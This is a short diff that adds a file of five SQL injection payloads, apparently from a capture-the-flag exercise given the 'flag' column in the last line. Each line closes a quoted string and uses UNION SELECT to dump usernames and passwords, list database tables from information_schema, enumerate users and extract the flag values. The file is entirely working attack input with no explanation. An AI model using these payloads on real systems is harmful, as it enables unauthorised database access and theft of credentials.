@@ -1,0 +1,9 @@
+guesdfsa' UNION SELECT username, password FROM users WHERE uid = 1 and ''='
+
+gudsfasa' UNION SELECT GROUP_CONCAT(table_name SEPARATOR ','), NULL FROM information_schema.tables WHERE ''='
+
+gudsfasa' UNION SELECT GROUP_CONCAT(username SEPARATOR ','), NULL FROM users WHERE ''='
+
+gudsfasa' UNION SELECT GROUP_CONCAT(username SEPARATOR ','), NULL FROM users WHERE uid > 50 and ''='
+
+gudsfasa' UNION SELECT GROUP_CONCAT(flag SEPARATOR ','), NULL FROM users WHERE uid > 50 and ''='
